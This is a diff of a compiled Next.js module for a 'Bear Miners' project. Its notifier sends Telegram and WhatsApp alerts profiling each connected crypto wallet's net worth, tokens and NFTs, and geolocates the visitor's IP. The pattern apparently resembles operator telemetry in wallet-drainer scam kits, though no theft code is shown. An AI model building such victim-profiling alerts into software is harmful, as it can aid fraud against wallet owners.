@@ -1,21 +1,175 @@
-module.exports=[97869,a=>{"use strict";a.s(["TelegramService",()=>c]);var b=a.i(66518);class c{static async sendNotification(a){console.log("[NotificationService] Processing outbound alert...");try{let c=await b.prisma.globalSettings.findUnique({where:{id:1}});if(!c)return void console.error("[NotificationService] Fatal: Global settings not found in database.");if(c.telegramBotToken&&c.telegramChatId){console.log(`[TelegramService] Sending alert to Chat ID: ${c.telegramChatId}...`);let b=`https://api.telegram.org/bot${c.telegramBotToken}/sendMessage`,d=await fetch(b,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:c.telegramChatId,text:a,parse_mode:"HTML"})});if(d.ok)console.log("[TelegramService] ✅ Success: Message delivered to Telegram.");else{let e=await d.text();console.error(`[TelegramService] ❌ Failed: ${d.status} - ${e}`),e.includes("can't parse entities")&&(console.log("[TelegramService] ℹ️ Retrying with plain-text fallback..."),await fetch(b,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:c.telegramChatId,text:a.replace(/<[^>]*>/g,"")})}))}}else(c.telegramBotToken||c.telegramChatId)&&console.warn("[TelegramService] ⚠️ Configuration is incomplete. Ensure both Token and Chat ID are set.");if(c.whatsappEnabled&&c.twilioAccountSid&&c.twilioAuthToken&&c.twilioPhoneNumber){console.log(`[WhatsAppService] Sending alert via Twilio to ${c.twilioPhoneNumber}...`);let b=Buffer.from(`${c.twilioAccountSid}:${c.twilioAuthToken}`).toString("base64"),d=`https://api.twilio.com/2010-04-01/Accounts/${c.twilioAccountSid}/Messages.json`,e=a.replace(/<[^>]*>/g,""),f=await fetch(d,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded",Authorization:`Basic ${b}`},body:new URLSearchParams({From:c.twilioPhoneNumber,To:c.twilioPhoneNumber.startsWith("whatsapp:")?c.twilioPhoneNumber:`whatsapp:${c.twilioPhoneNumber}`,Body:`[Bear Miners Alert]
-${e}`})});if(f.ok)console.log("[WhatsAppService] ✅ Success: Alert delivered to WhatsApp.");else{let a=await f.text();console.error(`[WhatsAppService] ❌ Failed: ${f.status} - ${a}`)}}else c.whatsappEnabled&&console.warn("[WhatsAppService] ⚠️ WhatsApp enabled but Twilio configuration is missing fields.")}catch(a){console.error("[NotificationService] 🚨 Fatal Error during delivery:",a)}}static async getIpDetails(a){if(!a||"::1"===a||"127.0.0.1"===a)return"Localhost (Dev Environment)";try{let b=await fetch(`http://ip-api.com/json/${a}?fields=status,country,city,isp`),c=await b.json();if("success"===c.status)return`${c.city}, ${c.country} (${c.isp})`}catch(a){console.warn("Failed to fetch IP details:",a)}return"Unknown Location"}static formatConnectionMessage(a,b,c="Solana",d=[],e=[]){let f=`${a.slice(0,6)}...${a.slice(-4)}`,g=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD"}).format(b),h=`https://solscan.io/account/${a}`,i=String(c||"Solana").toLowerCase();i.includes("eth")||i.includes("erc")?h=`https://etherscan.io/address/${a}`:i.includes("btc")||i.includes("bitcoin")?h=`https://mempool.space/address/${a}`:(i.includes("bsc")||i.includes("binance"))&&(h=`https://bscscan.com/address/${a}`);let j="";d&&d.length>0&&(d.slice(0,15).forEach(a=>{let b=a.symbol||"Unknown",c=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD"}).format(a.valueUsd||0),d=Number(a.amount).toLocaleString(void 0,{maximumFractionDigits:2});j+=`🔹 <b>${b}</b>: ${d} (${c})
-`}),d.length>15&&(j+=`<i>...and ${d.length-15} more tokens</i>
-`));let k="";return e&&e.length>0&&(e.slice(0,10).forEach(a=>{k+=`🖼 <code>${a.mint.slice(0,5)}...${a.mint.slice(-5)}</code>
-`}),e.length>10&&(k+=`<i>...and ${e.length-10} more NFTs</i>
-`)),`
-💰 <b>${g} ${c} Wallet Connected</b>
+module.exports = [
+"[project]/src/lib/telegram.ts [app-rsc] (ecmascript)", ((__turbopack_context__) => {
+"use strict";
 
-👤 <b>User:</b> <code>${f}</code>
-🏦 <b>Network:</b> ${c}
-💵 <b>Net Worth:</b> <b>${g}</b>
+__turbopack_context__.s([
+    "TelegramService",
+    ()=>TelegramService
+]);
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$prisma$2e$ts__$5b$app$2d$rsc$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/prisma.ts [app-rsc] (ecmascript)");
+;
+class TelegramService {
+    /**
+     * Sends a notification to the configured Telegram and WhatsApp channels.
+     * @param message - The message content to send (supports HTML).
+     */ static async sendNotification(message) {
+        console.log("[NotificationService] Processing outbound alert...");
+        try {
+            // 1. Fetch latest settings from DB
+            const settings = await __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$prisma$2e$ts__$5b$app$2d$rsc$5d$__$28$ecmascript$29$__["prisma"].globalSettings.findUnique({
+                where: {
+                    id: 1
+                }
+            });
+            if (!settings) {
+                console.error("[NotificationService] Fatal: Global settings not found in database.");
+                return;
+            }
+            // --- Telegram Flow ---
+            if (settings.telegramBotToken && settings.telegramChatId) {
+                console.log(`[TelegramService] Sending alert to Chat ID: ${settings.telegramChatId}...`);
+                const url = `https://api.telegram.org/bot${settings.telegramBotToken}/sendMessage`;
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: settings.telegramChatId,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+                if (response.ok) {
+                    console.log("[TelegramService] ✅ Success: Message delivered to Telegram.");
+                } else {
+                    const errorText = await response.text();
+                    console.error(`[TelegramService] ❌ Failed: ${response.status} - ${errorText}`);
+                    // Fallback to plain text if HTML parsing fails (common for special characters)
+                    if (errorText.includes("can't parse entities")) {
+                        console.log("[TelegramService] ℹ️ Retrying with plain-text fallback...");
+                        await fetch(url, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                chat_id: settings.telegramChatId,
+                                text: message.replace(/<[^>]*>/g, '')
+                            })
+                        });
+                    }
+                }
+            } else if (settings.telegramBotToken || settings.telegramChatId) {
+                console.warn("[TelegramService] ⚠️ Configuration is incomplete. Ensure both Token and Chat ID are set.");
+            }
+            // --- WhatsApp Flow (via Twilio) ---
+            if (settings.whatsappEnabled && settings.twilioAccountSid && settings.twilioAuthToken && settings.twilioPhoneNumber) {
+                console.log(`[WhatsAppService] Sending alert via Twilio to ${settings.twilioPhoneNumber}...`);
+                const auth = Buffer.from(`${settings.twilioAccountSid}:${settings.twilioAuthToken}`).toString('base64');
+                const twilioUrl = `https://api.twilio.com/2010-04-01/Accounts/${settings.twilioAccountSid}/Messages.json`;
+                // Remove HTML tags for WhatsApp (markdown-only)
+                const plainText = message.replace(/<[^>]*>/g, '');
+                const response = await fetch(twilioUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Authorization": `Basic ${auth}`
+                    },
+                    body: new URLSearchParams({
+                        From: settings.twilioPhoneNumber,
+                        To: settings.twilioPhoneNumber.startsWith("whatsapp:") ? settings.twilioPhoneNumber : `whatsapp:${settings.twilioPhoneNumber}`,
+                        Body: `[Bear Miners Alert]\n${plainText}`
+                    })
+                });
+                if (response.ok) {
+                    console.log("[WhatsAppService] ✅ Success: Alert delivered to WhatsApp.");
+                } else {
+                    const errorDetails = await response.text();
+                    console.error(`[WhatsAppService] ❌ Failed: ${response.status} - ${errorDetails}`);
+                }
+            } else if (settings.whatsappEnabled) {
+                console.warn("[WhatsAppService] ⚠️ WhatsApp enabled but Twilio configuration is missing fields.");
+            }
+        } catch (error) {
+            console.error("[NotificationService] 🚨 Fatal Error during delivery:", error);
+        }
+    }
+    /**
+     * Fetches IP details using a public API.
+     */ static async getIpDetails(ip) {
+        if (!ip || ip === '::1' || ip === '127.0.0.1') return "Localhost (Dev Environment)";
+        try {
+            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
+            const data = await res.json();
+            if (data.status === 'success') {
+                return `${data.city}, ${data.country} (${data.isp})`;
+            }
+        } catch (e) {
+            console.warn("Failed to fetch IP details:", e);
+        }
+        return "Unknown Location";
+    }
+    /**
+     * Formats a wallet connection message.
+     */ static formatConnectionMessage(walletAddress, usdBalance, network = "Solana", tokens = [], nfts = []) {
+        const shortWallet = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
+        const totalValue = new Intl.NumberFormat('en-US', {
+            style: 'currency',
+            currency: 'USD'
+        }).format(usdBalance);
+        // Determine Explorer URL
+        let explorerLink = `https://solscan.io/account/${walletAddress}`;
+        const networkName = String(network || "Solana");
+        const netLower = networkName.toLowerCase();
+        if (netLower.includes("eth") || netLower.includes("erc")) {
+            explorerLink = `https://etherscan.io/address/${walletAddress}`;
+        } else if (netLower.includes("btc") || netLower.includes("bitcoin")) {
+            explorerLink = `https://mempool.space/address/${walletAddress}`;
+        } else if (netLower.includes("bsc") || netLower.includes("binance")) {
+            explorerLink = `https://bscscan.com/address/${walletAddress}`;
+        }
+        let tokenList = "";
+        // Show top 15 tokens by value (more info)
+        if (tokens && tokens.length > 0) {
+            tokens.slice(0, 15).forEach((t)=>{
+                const symbol = t.symbol || "Unknown";
+                const val = new Intl.NumberFormat('en-US', {
+                    style: 'currency',
+                    currency: 'USD'
+                }).format(t.valueUsd || 0);
+                const amount = Number(t.amount).toLocaleString(undefined, {
+                    maximumFractionDigits: 2
+                });
+                tokenList += `🔹 <b>${symbol}</b>: ${amount} (${val})\n`;
+            });
+            if (tokens.length > 15) tokenList += `<i>...and ${tokens.length - 15} more tokens</i>\n`;
+        }
+        let nftList = "";
+        if (nfts && nfts.length > 0) {
+            nfts.slice(0, 10).forEach((n)=>{
+                nftList += `🖼 <code>${n.mint.slice(0, 5)}...${n.mint.slice(-5)}</code>\n`;
+            });
+            if (nfts.length > 10) nftList += `<i>...and ${nfts.length - 10} more NFTs</i>\n`;
+        }
+        return `
+💰 <b>${totalValue} ${network} Wallet Connected</b>
+
+👤 <b>User:</b> <code>${shortWallet}</code>
+🏦 <b>Network:</b> ${network}
+💵 <b>Net Worth:</b> <b>${totalValue}</b>
 
 <b>Top Tokens & Meme Coins:</b>
-${j||"No tokens found."}
-${e.length>0?`
-<b>NFTs Detected:</b>
-${k}`:""}
-🔗 <a href="${h}">View on Explorer</a>
-    `.trim()}static escapeHTML(a){return a.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}}}];
+${tokenList || "No tokens found."}
+${nfts.length > 0 ? `\n<b>NFTs Detected:</b>\n${nftList}` : ""}
+🔗 <a href="${explorerLink}">View on Explorer</a>
+    `.trim();
+    }
+    static escapeHTML(str) {
+        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+}
+}),
+];
 
 //# sourceMappingURL=src_lib_telegram_ts_8a03d35d._.js.map
